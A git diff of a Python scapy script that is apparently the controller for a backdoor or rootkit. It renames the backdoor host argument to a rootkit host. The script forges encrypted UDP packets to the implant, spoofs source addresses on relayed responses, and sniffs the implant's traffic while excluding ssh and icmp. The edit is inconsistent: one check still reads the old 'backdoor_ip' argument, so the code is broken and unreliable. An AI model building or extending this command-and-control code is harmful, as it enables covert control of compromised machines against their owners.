@@ -27,7 +27,7 @@ from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
 # Command Line Arguments
 PARSER = argparse.ArgumentParser("./main.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host")
-PARSER.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
+PARSER.add_argument("rootkit_ip", help="The IPv4 address of the rootkit host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
 
@@ -38,7 +38,7 @@ if not validate_ipv4_address(ARGS.controller_ip):
     exit(1)
 
 if not validate_ipv4_address(ARGS.backdoor_ip):
-    print(f"Invalid IPv4 Address: '{ARGS.backdoor_ip}'")
+    print(f"Invalid IPv4 Address: '{ARGS.rootkit_ip}'")
     exit(1)
 
 if not validate_nic_interface(ARGS.interface):
@@ -48,7 +48,7 @@ if not validate_nic_interface(ARGS.interface):
 
 # Global Variables
 CONTROLLER_IP = ARGS.controller_ip
-BACKDOOR_IP = ARGS.backdoor_ip
+ROOTKIT_IP = ARGS.rootkit_ip
 NETWORK_INTERFACE = ARGS.interface
 QUEUE = SimpleQueue()
 ENCRYPTION_HANDLER = StreamEncryption()
@@ -76,14 +76,14 @@ def subprocess_packet_handler(pkt):
     response = sr1(forged, verbose=0)
     # 5. send the response back to the backdoor machine.
     response[IP].src = f"{CONTROLLER_IP}"
-    response[IP].dst = f"{BACKDOOR_IP}"
+    response[IP].dst = f"{ROOTKIT_IP}"
     send(response, verbose=0)
 
 
 def subprocess_start():
     """
     """
-    sniff(filter=f"ip src host {BACKDOOR_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
+    sniff(filter=f"ip src host {ROOTKIT_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
 
 
 def send_udp(data: str):
@@ -98,7 +98,7 @@ def send_udp(data: str):
     # Encrypt the data.
     data = ENCRYPTION_HANDLER.encrypt(data)
     # Forge the UDP packet.
-    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{BACKDOOR_IP}")/UDP(sport=10069, dport=10420, len=len(data))
+    pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{ROOTKIT_IP}")/UDP(sport=10069, dport=10420, len=len(data))
     pkt[UDP].payload = Raw(data)
     # Send the packet.
     send(pkt, verbose=0)
